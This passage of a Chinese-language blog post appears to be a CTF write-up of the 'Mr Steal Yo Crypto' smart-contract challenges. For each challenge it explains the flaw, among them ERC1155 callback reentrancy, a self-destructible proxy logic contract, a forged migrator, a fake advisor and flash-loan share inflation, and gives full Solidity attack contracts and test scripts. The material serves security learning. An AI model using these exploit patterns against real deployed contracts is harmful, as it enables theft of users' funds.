    function attack(uint amount) public&#123;
        vault(target).depositFor(address(this), amount, address(this));
        vault(target).withdrawAll();
    &#125;
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external &#123;
        IERC20(token).approve(to, value);
        vault(target).depositAll();
    &#125;

    function transfer1() public&#123;
        IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));
    &#125;

&#125;
</code></pre><p>测试 </p>
<pre><code>it(&quot;solves the challenge&quot;, async function () &#123;
let VaultAttackFactory = await ethers.getContractFactory(&#39;vaultattack&#39;,attacker);
let VaultAttackContract = await VaultAttackFactory.deploy(safuVault.address,attacker.getAddress(),usdc.address);
await usdc.connect(attacker).transfer(VaultAttackContract.address,precision.mul(10_000));
await VaultAttackContract.attack(precision.mul(await usdc.balanceOf(VaultAttackContract.address)));
await VaultAttackContract.attack(precision.mul(await usdc.balanceOf(VaultAttackContract.address)));
await VaultAttackContract.attack(precision.mul(await usdc.balanceOf(VaultAttackContract.address)));
await VaultAttackContract.transfer1();
&#125;);
</code></pre><p>重入三次后 就可以削减金库的90%<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2.png" alt="2"></p>
<h2 id="game-assets"><a href="#game-assets" class="headerlink" title="game-assets"></a>game-assets</h2><p>GG 实验室刚刚发布了他们的 nOtApOnZi 游戏，该游戏允许将多个 WL 的 NFT 用作游戏内物品。<br>为了集成多个 ERC721 代币，他们有一个包装合约 （ERC1155） 来包装 NFT，允许它们在游戏中使用。用户还可以在使用完 NFT 后解开他们的包装。<br>您的任务是通过将用户的 NFT 困在包装合约中并使它们无法挽回来使用户感到悲伤。  </p>
<p>主要实现功能的包装合约  </p>
<pre><code>//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;
import &quot;@openzeppelin/contracts/utils/Counters.sol&quot;;
import &quot;./AssetHolder.sol&quot;;


interface IGameAsset &#123;
    function ownerOf(uint256 tokenId) external returns (address);
    function isApprovedForAll(
        address owner, 
        address operator
    ) external returns (bool);
    function setOwnerOperator(
        address to,
        uint256 tokenId
    ) external;
&#125;

/// @dev functionality for wrapping and unwrapping assets for use in the game
/// @dev the game strictly references this contract for determining assets user owns
/// @dev stores a whitelist of GameAsset contracts that are used by this game
/// @dev while NFTs are used in the game, they cannot be bought/sold/transferred
/// @dev that is why this contract temporarily takes ownership of NFTs used in-game
contract AssetWrapper is AssetHolder, Ownable &#123;

    // used to keep track of the current token ID for newly added GameAssets
    using Counters for Counters.Counter;
    Counters.Counter private _tokenId;

    /// @dev allows whitelisting of GameAsset contracts
    mapping(address =&gt; bool) private _whitelist;

    /// @dev token ID for each whitelisted GameAsset contract
    mapping(address =&gt; uint256) private _assetId;

    constructor(
        string memory uri
    ) AssetHolder (
        uri
    ) &#123;&#125;

    /// @dev owner can whitelist GameAsset ERC721 contracts
    /// @dev a GameAsset contract cannot be removed from the WL
    function updateWhitelist(address asset) external onlyOwner &#123;
        if (!_whitelist[asset]) &#123;
            _assetId[asset]=_tokenId.current();
            _whitelist[asset] = true;
            _tokenId.increment();
        &#125;
    &#125;

    /// @dev returns whether an asset is whitelisted
    function isWhitelisted(address asset) public view returns (bool) &#123;
        return _whitelist[asset];
    &#125;

    /// @dev wraps arbitrary whitelisted ERC721 game assets
    /// @param nftId Unique id of the asset the user is wrapping
    /// @param assetOwner Address of owner to assign this game asset
    /// @param assetAddress Address of the GameAsset contract
    function wrap(
        uint256 nftId,
        address assetOwner,
        address assetAddress
    ) public &#123;
        require(isWhitelisted(assetAddress), &quot;Wrapper: asset not whitelisted&quot;);
        _wrap(assetOwner, assetAddress, nftId);

        IGameAsset asset = IGameAsset(assetAddress);
        address owner = asset.ownerOf(nftId);

        // can be removed to allow wrapping to any account, saving gas on transfer
        require(assetOwner == owner, &quot;Wrapper: incorrect receiver for wrap&quot;);

        require(
            owner == msg.sender ||
                isApprovedForAll(owner, msg.sender) || // approval for all WLed contracts
                asset.isApprovedForAll(owner, msg.sender), // approval for this WL contract
            &quot;Wrapper: asset is not owned by sender&quot;
        );

        asset.setOwnerOperator( // wrapper takes control of asset
            address(this),
            nftId
        );
    &#125;

    /// @dev unwraps assets and transfers NFT back to user `assetOwner`
    /// @dev per game mechanics user has max of one wrapped NFT per token ID
    function unwrap(
        address assetOwner,
        address assetAddress
    ) public &#123;
        require(isWhitelisted(assetAddress), &quot;Wrapper: asset not whitelisted&quot;);

        IGameAsset asset = IGameAsset(assetAddress);

        require(
            assetOwner == msg.sender ||
                isApprovedForAll(assetOwner, msg.sender) || // approval for all WLed contracts
                asset.isApprovedForAll(assetOwner, msg.sender), // approval for this WL contract
            &quot;Wrapper: asset if not owned by sender&quot;
        );

        _unwrap(assetOwner, assetAddress);
    &#125;

    function _wrap(
        address assetOwner,
        address assetAddress,
        uint256 nftId
    ) private &#123;
        uint256 assetId = _assetId[assetAddress];
        bytes memory data = abi.encode(nftId);
        _mint(assetOwner, assetId, 1, data);
    &#125;

    function _unwrap(
        address assetOwner,
        address assetAddress
    ) private &#123;
        uint256 assetId = _assetId[assetAddress];
        uint256 nftId = getIdOwned(assetId, assetOwner); // NFT id owned by user

        _burn(assetOwner, assetId, 1); // reverts if user doesn&#39;t own asset

        IGameAsset(assetAddress).setOwnerOperator( // wrapper relinquishes control of asset
            assetOwner,
            nftId
        );
    &#125;

&#125;
</code></pre><p>测试中可以看到  </p>
<pre><code>await assetWrapper.connect(admin).updateWhitelist(swordAsset.address)
await assetWrapper.connect(admin).updateWhitelist(shieldAsset.address)

// set the operator of the two game assets to be the wrapper contract
await swordAsset.connect(admin).setOperator(assetWrapper.address)
await shieldAsset.connect(admin).setOperator(assetWrapper.address)

// adminUser is the user you will be griefing
// minting 1 SWORD &amp; 1 SHIELD asset for adminUser
await swordAsset.connect(admin).mintForUser(await adminUser.getAddress(),1)
await shieldAsset.connect(admin).mintForUser(await adminUser.getAddress(),1)
</code></pre><p>swordAsset和shieldAsset为包装合约（assetWrapper）设置了operator<br>这使assetWrapper可以通过setOwnerOperator（）不经过主人的同意就转走他的nft<br>看assetWrapper的warp函数 它可以经过nft主人同意把nft转给本合约 然后为主人铸造assetWrapper代币<br>当需要取走时 调用unwarp函数 销毁assetWrapper代币并把nft再转给主人<br>合约的漏洞在于warp函数  </p>
<pre><code>function wrap(
            uint256 nftId,
            address assetOwner,
            address assetAddress
        ) public &#123;
            require(isWhitelisted(assetAddress), &quot;Wrapper: asset not whitelisted&quot;);
            _wrap(assetOwner, assetAddress, nftId);

            IGameAsset asset = IGameAsset(assetAddress);
            address owner = asset.ownerOf(nftId);

            // can be removed to allow wrapping to any account, saving gas on transfer
            require(assetOwner == owner, &quot;Wrapper: incorrect receiver for wrap&quot;);

            require(
                owner == msg.sender ||
                    isApprovedForAll(owner, msg.sender) || // approval for all WLed contracts
                    asset.isApprovedForAll(owner, msg.sender), // approval for this WL contract
                &quot;Wrapper: asset is not owned by sender&quot;
            );

            asset.setOwnerOperator( // wrapper takes control of asset
                address(this),
                nftId
            );
        &#125;
</code></pre><p>可以看到warp函数先为请求者铸造代币  然后在对主人是否授权进行验证，这明显不合理<br>可以看到在铸币完成后会触发安全检验<br>   _doSafeBatchTransferAcceptanceCheck(operator, address(0), to, ids, amounts, data);</p>
<pre><code>function _doSafeTransferAcceptanceCheck(
        address operator,
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes memory data
    ) private &#123;
        if (to.isContract()) &#123;
            try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) &#123;
                if (response != IERC1155Receiver.onERC1155Received.selector) &#123;
                    revert(&quot;ERC1155: ERC1155Receiver rejected tokens&quot;);
                &#125;
            &#125; catch Error(string memory reason) &#123;
                revert(reason);
            &#125; catch &#123;
                revert(&quot;ERC1155: transfer to non ERC1155Receiver implementer&quot;);
            &#125;
        &#125;
    &#125;
</code></pre><p>会触发铸造者的onERC1155Received函数<br>而如果我们在这个函数中进行unwarp 这时因为在铸币过程中assetWrapper合约记录的nft主人是我们自己的合约 _ownsAny[id][to]也会变为true 所以可以通过验证  assetWrapper合约会把nft发给我们的攻击账户  我们的攻击账户成了nft的主人 自然可以通过warp的剩下逻辑 交易会成功 我们获得了nft  </p>
<p>攻击合约  </p>
<pre><code>    //SPDX-License-Identifier: MIT
    pragma solidity ^0.8.4;
    import &quot;@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol&quot;;
    interface AssertWrap&#123;
        function wrap(
            uint256 nftId,
            address assetOwner,
            address assetAddress
        ) external;
        function unwrap(
            address assetOwner,
            address assetAddress
        ) external;
    &#125;

    contract AssertAttack&#123;

        address assertWarp;
        address nft1;
        address nft2;
        int count = 0 ;

        constructor(address _warp,address token1,address token2) public&#123;
            assertWarp = _warp;
            nft1 = token1;
            nft2 = token2;
        &#125;

        function attack() public &#123;
            AssertWrap(assertWarp).wrap(0,address(this),nft1);
            AssertWrap(assertWarp).wrap(0,address(this),nft2);
        &#125;

        function onERC1155Received(
            address operator,
            address from,
            uint256 id,
            uint256 value,
            bytes calldata data
        ) external returns (bytes4)&#123;
            if(count == 0)&#123;
            AssertWrap(assertWarp).unwrap(address(this), nft1);
            count++;
            return IERC1155Receiver.onERC1155Received.selector;&#125;

            AssertWrap(assertWarp).unwrap(address(this), nft2);


            return IERC1155Receiver.onERC1155Received.selector;
        &#125;
    &#125;
</code></pre><p>测试</p>
<pre><code>    it(&quot;solves the challenge&quot;, async function () &#123;
    let AssertAttackFactory = await ethers.getContractFactory(&#39;AssertAttack&#39;);
    let AssertAttack = await AssertAttackFactory.deploy(assetWrapper.address,swordAsset.address,shieldAsset.address)
    await AssertAttack.attack();

    &#125;);
</code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="3.png" alt="2"></p>
<h2 id="safu-wallet"><a href="#safu-wallet" class="headerlink" title="safu-wallet"></a>safu-wallet</h2><p>题目要求admin向wallet发送交易时被回退  也就是钱包的功能被瘫痪<br>观察测试时可以知道wallet的部署方式时代理<br>SafuWallet合约是代理合约 SafuWalletLibrary为逻辑合约  </p>
<p>SafuWallet合约部署时会调用初始化函数  但是改变的只是代理合约的状态变量  也就是逻辑合约（SafuWalletLibrary）的状态未发生改变</p>
<p>可以看到逻辑合约中有一个自毁函数 那么我们就可以对逻辑进行初始化，然后再自毁来瘫痪钱包功能</p>
<p>it(“solves the challenge”, async function () {<br>    await safuWalletLibrary.connect(attacker).initWallet([],0,ethers.0);<br>    await safuWalletLibrary.connect(attacker).kill(await attacker.getAddress());<br>});</p>
<h2 id="tasty-stake"><a href="#tasty-stake" class="headerlink" title="tasty-stake"></a>tasty-stake</h2><p>实验室已经发布了他们的 TastyStakes合约，该合约允许您质押stake以获得 BUTTER 代币。<br>您的任务是从质押合约中耗尽所有 STEAK 代币。</p>
<p>  await steak.connect(admin).mintPerUser( // attacker gets 1 steak<br>    [await adminUser.getAddress(), await attacker.getAddress()],<br>    [precision.mul(100_000), precision.mul(1)]<br>  )</p>
<p>attacker初始拥有1eth的steak代币</p>
<p>发现TastyStaking中有这样一个功能，把旧TastyStaking合约中的staking和reward代币转移到本合约上。</p>
<pre><code>function migrateStake(address oldStaking, uint256 amount) external &#123;
        TastyStaking(oldStaking).migrateWithdraw(msg.sender, amount);
        _applyStake(msg.sender, amount);
    &#125;

function migrateWithdraw(address staker, uint256 amount) external onlyMigrator &#123;
    _withdrawFor(staker, msg.sender, amount, true, staker);
&#125;
function _applyStake(address _for, uint256 _amount) internal updateReward(_for) &#123;
    _totalSupply += _amount;
    _balances[_for] += _amount;
    emit Staked(_for, _amount);
&#125;
</code></pre><p>但他未对旧合约的地址进行严格的审查  这就导致我们可以随便创建一个外部合约，实现migrateWithdraw接口，然后就可以随意增加我们的余额<br>    pragma solidity ^0.8.4;</p>
<pre><code>contract TastyStakeAttack &#123;

    function migrateWithdraw(address staker, uint256 amount) external &#123;
    &#125;

&#125;


it(&quot;solves the challenge&quot;, async function () &#123;
    let TastyStakeAttack = await (await ethers.getContractFactory(&#39;TastyStakeAttack&#39;)).deploy();
    await tastyStaking.connect(attacker).migrateStake(TastyStakeAttack.address,precision.mul(100_000))
    await tastyStaking.connect(attacker).withdrawAll(false);
&#125;);
</code></pre><h2 id="freebie"><a href="#freebie" class="headerlink" title="freebie"></a>freebie</h2><p>有一个质押合约RewardsAdvisor，它接受FARM代币并铸造等量的xFARM<br>您的任务是从此合约中抽空 99.99%+ 的 FARM 代币。</p>
<p>观察合约中的deposit函数    </p>
<pre><code>function deposit(
    uint256 farmDeposit,
    address payable from,
    address to
) external returns (uint256 shares) &#123;
    require(farmDeposit &gt; 0, &quot;deposits must be nonzero&quot;);
    require(to != address(0) &amp;&amp; to != address(this), &quot;to&quot;);
    require(from != address(0) &amp;&amp; from != address(this), &quot;from&quot;);

    shares = farmDeposit;
    if (xfarm.totalSupply() != 0) &#123;
        uint256 farmBalance = farm.balanceOf(address(this));
        shares = (shares * xfarm.totalSupply()) / farmBalance;
    &#125;

    if (isContract(from)) &#123;
        require(IAdvisor(from).owner() == msg.sender); // admin
        IAdvisor(from).delegatedTransferERC20(address(farm), address(this), farmDeposit);
    &#125; else &#123;
        require(from == msg.sender); // user
        farm.safeTransferFrom(from, address(this), farmDeposit);
    &#125;

    xfarm.mint(to, shares);
&#125;
</code></pre><p>发现deposit函数没有对合约自身的token余额是否增加进行检查</p>
<pre><code>//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


contract RewardAdvisorAttack&#123;
    address public owner1;

    constructor(address add) public&#123;
        owner = add;
    &#125;
    function delegatedTransferERC20(address token, address to, uint256 amount) external&#123;

    &#125;
    function owner() external returns (address)&#123;
        return owner1;
    &#125;
&#125;

it(&quot;solves the challenge&quot;, async function () &#123;
    let attackContract = await (await ethers.getContractFactory(&quot;RewardAdvisorAttack&quot;,attacker)).deploy(await attacker.getAddress());
    await rewardsAdvisor.connect(attacker).deposit(precision.mul(1_000_000_000),attackContract.address,await attacker.getAddress());
    await rewardsAdvisor.connect(attacker).withdraw(precision.mul(1_000_000_000),await attacker.getAddress(),await attacker.getAddress());
&#125;);
</code></pre><h2 id="nft-bonanza"><a href="#nft-bonanza" class="headerlink" title="nft-bonanza"></a>nft-bonanza</h2><p>新的 NFT 交易所合约 BonanzaMarketplace 已经推出，允许交易选定的白名单 ERC721 和 ERC1155 代币。<br>您的挑战是滑动所有列出的 NFT。</p>
<h2 id="governance-shenanigans"><a href="#governance-shenanigans" class="headerlink" title="governance-shenanigans"></a>governance-shenanigans</h2><p>观察合约 发现_moveDelegates函数在srcRep和dstRep相等时和amount&gt;0时不会进行任何操作，并且整个delegate操作后token还在delegator手中。一共有三个可用账户，那么一个账户给attacker进行delegate后，可以将token转走然后将本地址的delegatee清零，这样就可以在钱转回来时重新为attacker进行delegate。</p>
<p>解决方案<br>it(“solves the challenge”, async function () {</p>
<p>  await governanceToken.connect(attacker).transfer(await o1.getAddress(), precision.mul(500))<br>  expect(await governanceToken.balanceOf(await o1.getAddress())).to.be.eq(precision.mul(500))<br>  console.log(“transfer success”)<br>  await governanceToken.connect(o1).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(500))<br>  console.log(“o1 delegate attack success 1”)</p>
<p>  await governanceToken.connect(o1).transfer(await o2.getAddress(), precision.mul(500))<br>  expect(await governanceToken.balanceOf(await o2.getAddress())).to.be.eq(precision.mul(500))<br>  console.log(“transfer success”)<br>  await governanceToken.connect(o2).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(1000))<br>  console.log(“o2 delegate attack success 2”)</p>
<p>  await governanceToken.connect(o1).delegate(“0x0000000000000000000000000000000000000000”);<br>  await governanceToken.connect(o2).transfer(await o1.getAddress(), precision.mul(500))<br>  await governanceToken.connect(o1).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(1500))<br>  console.log(“o1 delegate attack success 3”)</p>
<p>  await governanceToken.connect(o2).delegate(“0x0000000000000000000000000000000000000000”);<br>  await governanceToken.connect(o1).transfer(await o2.getAddress(), precision.mul(500))<br>  await governanceToken.connect(o2).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(2000))<br>  console.log(“o2 delegate attack success 4”)</p>
<p>  await governanceToken.connect(o1).delegate(“0x0000000000000000000000000000000000000000”);<br>  await governanceToken.connect(o2).transfer(await o1.getAddress(), precision.mul(500))<br>  await governanceToken.connect(o1).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(2500))<br>  console.log(“o1 delegate attack success 4”)</p>
<p>});</p>
<h2 id="flash-loaner"><a href="#flash-loaner" class="headerlink" title="flash-loaner"></a>flash-loaner</h2><p>闪贷合同接受用户的资金，以促进闪贷，他们收取少量费用。这笔费用作为收益提供给存款人。</p>
<p>您的任务是从该合同中抽取 99%+ 的用户资金。你从没有资金开始。</p>
<p>本题中提供闪贷的是usdc代币  而闪贷合约本身是一个erc4626<br>闪贷前后检查的是本地址的usdc代币余额 而deposit会将调用者的usdc转入本地址，并且铸造erc4626<br>那么闪贷出来的钱用于deposit 那么我们只需要额外付一些闪贷费用 就可以铸造很多erc4626<br>那么闪贷费用向哪里找？<br>题目中还提供了一个usdc和dai代币的UniswapV2交易对，提供swap（闪贷）功能，那么我们先用swap贷出flash费用，然后利用上述方法铸造erc4626，<br>之后将erc4626 withdraw得到闪贷池巨额usdc，分出一部分来偿还swap费用和本金<br>攻击合约  </p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol&quot;;

//import &quot;@nomiclabs/buidler/console.sol&quot;;

interface Iflashloaner &#123;
    function flash(
        address recipient,
        uint256 amount,
        bytes calldata data
    ) external;

    function convertToAssets(
        uint256 shares
    ) external view returns (uint256 assets);

    function deposit(
        uint256 assets,
        address receiver
    ) external returns (uint256);

    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256);

    function previewDeposit(uint256 assets) external returns (uint256);

    function maxWithdraw(address owner) external returns (uint256);
&#125;

interface UniV2Swap &#123;
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
&#125;

interface token &#123;
    function transfer(address to, uint amount) external;

    function approve(address spender, uint256 amount) external returns (bool);
&#125;

contract flashLoanerExploiter &#123;
    using Math for uint256;
    Iflashloaner loner;
    UniV2Swap swaper;
    UniV2Swap router;
    token Token;

    uint256 public feeBasis = 100;
    uint256 public constant feeMax = 10_000; // basis points

    uint flashamount;
    uint swapFee;

    constructor(address _loner, address _swaper, address _token) public &#123;
        loner = Iflashloaner(_loner);
        swaper = UniV2Swap(_swaper);
        Token = token(_token);
    &#125;

    function Swap(uint amount) public payable &#123;
        swaper.swap(amount, 0, address(this), &quot;12&quot;);
    &#125;

    function setSwapFee(uint amount) public payable &#123;
        swapFee = amount;
    &#125;

    function Setflash(uint amount) public payable &#123;
        flashamount = amount;
    &#125;

    function flashCallback(uint256 fee, bytes calldata data) external &#123;
        Token.approve(address(loner), flashamount);
        loner.deposit(flashamount, address(this));
        Token.transfer(address(loner), fee);
    &#125;

    function uniswapV2Call(
        address spender,
        uint amount1Out,
        uint amount2Out,
        bytes memory data
    ) external &#123;
        loner.flash(address(this), flashamount, &quot;&quot;);
        uint shares = loner.maxWithdraw(address(this));
        uint assert = loner.withdraw(shares, address(this), address(this));
        Token.transfer(address(swaper), 1004 * 10 ** 18);
    &#125;

    function finish(address add, uint amount) public &#123;
        Token.transfer(add, amount);
    &#125;
&#125;
</code></pre><p>测试部分</p>
<pre><code>it(&quot;solves the challenge&quot;, async function () &#123;
    let pairAddress = await uniFactory.getPair(usdc.address, dai.address)
    let flashLonerExploiterFactory = await ethers.getContractFactory(&#39;flashLoanerExploiter&#39;);
    let flashLonerExploiter = await flashLonerExploiterFactory.deploy(flashLoaner.address, pairAddress, usdc.address);

    await flashLonerExploiter.setSwapFee(await uniRouter.getAmountIn(precision.mul(1_000), precision.mul(1_000_000), precision.mul(1_000_000)));

    await flashLonerExploiter.Setflash(precision.mul(99_999));
    await flashLonerExploiter.Swap(precision.mul(1_000));
    let amount = await usdc.balanceOf(flashLonerExploiter.address);
    console.log(&quot;Contract Balances:&quot; + amount);
    await flashLonerExploiter.finish(await attacker.getAddress(), amount);

&#125;);
</code></pre></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">lsq</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/11/26/crypto/">http://example.com/2022/11/26/crypto/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A0%87%E7%AD%BE1/">标签1</a></div><div class="post_share"><div class="social-share" data-image="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2018-10-26%2F5bd2cf1873f75.jpg&amp;refer=http%3A%2F%2Fpic1.win4000.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1672059133&amp;t=52c973f7c56ace492c2a4e392b7595a3" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/26/Argument-Encoding/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.alicdn.com%2Fi1%2F3159590468%2FO1CN01POiQ7C1FKNysIsN6R_%21%213159590468.jpg&amp;refer=http%3A%2F%2Fimg.alicdn.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1672058965&amp;t=d7380115aef9b394d6c2baf4dee63799" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">argument encoding</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/26/proxy/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fnewyx-img.hellonitrack.com%2Fnewspic%2Fimage%2F201604%2F19%2Fedb692c68a.jpg&amp;refer=http%3A%2F%2Fnewyx-img.hellonitrack.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1672058872&amp;t=cc2d3a13d9ca1a3aeba531f44bb0c695" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">proxy</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/11/26/Argument-Encoding/" title="argument encoding"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.alicdn.com%2Fi1%2F3159590468%2FO1CN01POiQ7C1FKNysIsN6R_%21%213159590468.jpg&refer=http%3A%2F%2Fimg.alicdn.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672058965&t=d7380115aef9b394d6c2baf4dee63799" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-26</div><div class="title">argument encoding</div></div></a></div><div><a href="/2023/02/25/Damn-valurable-defi-sotion/" title="Damn vaulnerable Defi 题解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=3431118657,348133440&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=281" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-25</div><div class="title">Damn vaulnerable Defi 题解</div></div></a></div><div><a href="/2023/07/14/ERC/" title="ERC系列合约学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2020-07-22%2F5f17fe80ceaae.jpg&refer=http%3A%2F%2Fpic1.win4000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672059006&t=740baec47daa0a9f466c4033a1cc4e92" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-14</div><div class="title">ERC系列合约学习</div></div></a></div><div><a href="/2023/12/10/UniswapV3%E5%AD%A6%E4%B9%A0/" title="UniswapV3 - 原理"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=471504868,3486654871&fm=253&fmt=auto&app=138&f=JPEG?w=889&h=500" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-10</div><div class="title">UniswapV3 - 原理</div></div></a></div><div><a href="/2023/05/29/chainflagctf/" title="chainflagctf"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2018-10-26%2F5bd2cf1873f75.jpg&refer=http%3A%2F%2Fpic1.win4000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672059133&t=52c973f7c56ace492c2a4e392b7595a3" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-29</div><div class="title">chainflagctf</div></div></a></div><div><a href="/2023/10/10/funstr/" title="函数体任意转跳漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fnewyx-img.hellonitrack.com%2Fnewspic%2Fimage%2F201604%2F19%2Fedb692c68a.jpg&refer=http%3A%2F%2Fnewyx-img.hellonitrack.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672058872&t=cc2d3a13d9ca1a3aeba531f44bb0c695" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-10</div><div class="title">函数体任意转跳漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=1478036750,1488409170&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=800&amp;h=500" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lsq</div><div class="author-info__description">lsq</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/shaflow-fol"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/shaflow01" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/shaflow01@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mr-Steal-Yo-Crypto-%E9%A2%98%E8%A7%A3"><span class="toc-text">Mr Steal Yo Crypto 题解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 